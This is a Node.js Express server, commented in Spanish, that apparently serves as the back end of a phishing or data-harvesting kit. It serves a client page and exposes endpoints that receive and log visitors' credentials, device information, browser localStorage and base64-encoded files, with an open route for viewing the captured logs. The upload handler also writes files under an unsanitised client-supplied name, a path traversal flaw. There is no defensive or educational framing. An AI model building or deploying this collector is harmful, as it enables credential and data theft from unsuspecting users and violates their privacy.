const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs-extra');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ==================== MIDDLEWARES ====================
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Crear directorios necesarios
fs.ensureDirSync('./logs');
fs.ensureDirSync('./uploads');

// ==================== SERVIR EL CLIENTE ====================
// Ruta absoluta al folder cliente (importante para tu estructura)
const clientPath = path.join(__dirname, '..', 'cliente');

app.use(express.static(clientPath));

// Ruta principal - Sirve el index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(clientPath, 'index.html'));
});

// ==================== RUTAS API ====================

// Información del dispositivo
app.post('/api/device-info', async (req, res) => {
    try {
        const data = req.body;
        const logEntry = {
            timestamp: new Date().toISOString(),
            ip: req.ip,
            data: data
        };
        
        await fs.appendFile('./logs/device_info.log', JSON.stringify(logEntry) + '\n');
        console.log('Device info recibida:', data.userAgent || 'Sin userAgent');
        
        res.status(200).json({ status: 'success', message: 'Device info received' });
    } catch (error) {
        console.error('Error device-info:', error);
        res.status(500).json({ status: 'error', message: 'Internal server error' });
    }
});

// Credenciales
app.post('/api/credentials', async (req, res) => {
    try {
        const credentials = req.body;
        const logEntry = {
            timestamp: new Date().toISOString(),
            ip: req.ip,
            credentials: credentials
        };
        
        await fs.appendFile('./logs/credentials.log', JSON.stringify(logEntry) + '\n');
        console.log('Credenciales recibidas:', credentials.username || 'Sin username');
        
        res.status(200).json({ status: 'success', message: 'Credentials received' });
    } catch (error) {
        console.error('Error credentials:', error);
        res.status(500).json({ status: 'error', message: 'Internal server error' });
    }
});

// Archivos
app.post('/api/files', async (req, res) => {
    try {
        const fileData = req.body;
        const logEntry = {
            timestamp: new Date().toISOString(),
            ip: req.ip,
            file: { name: fileData.name, size: fileData.size }
        };
        
        await fs.appendFile('./logs/files.log', JSON.stringify(logEntry) + '\n');
        console.log('Archivo recibido:', fileData.name);

        // Guardar archivo (opcional)
        if (fileData.content && fileData.name) {
            const buffer = Buffer.from(fileData.content.split(',')[1], 'base64');
            await fs.outputFile(`./uploads/${fileData.name}`, buffer);
        }
        
        res.status(200).json({ status: 'success', message: 'File received' });
    } catch (error) {
        console.error('Error files:', error);
        res.status(500).json({ status: 'error', message: 'Internal server error' });
    }
});

// LocalStorage
app.post('/api/localstorage', async (req, res) => {
    try {
        const storageData = req.body;
        const logEntry = {
            timestamp: new Date().toISOString(),
            ip: req.ip,
            storage: storageData
        };
        
        await fs.appendFile('./logs/localstorage.log', JSON.stringify(logEntry) + '\n');
        console.log('LocalStorage recibido');
        
        res.status(200).json({ status: 'success', message: 'LocalStorage received' });
    } catch (error) {
        console.error('Error localstorage:', error);
        res.status(500).json({ status: 'error', message: 'Internal server error' });
    }
});

// Ver logs (solo para desarrollo - ¡cuidado en producción!)
app.get('/api/logs/:type', (req, res) => {
    const logType = req.params.type;
    const logFiles = {
        device: './logs/device_info.log',
        credentials: './logs/credentials.log',
        files: './logs/files.log',
        storage: './logs/localstorage.log'
    };
    
    if (logFiles[logType]) {
        try {
            const logs = fs.readFileSync(logFiles[logType], 'utf8');
            res.send(`<pre>${logs}</pre>`);
        } catch (error) {
            res.status(404).send('Log file not found');
        }
    } else {
        res.status(400).send('Invalid log type');
    }
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`📍 Accede aquí: http://localhost:${PORT}`);
    console.log(`📁 Client path: ${clientPath}`);
});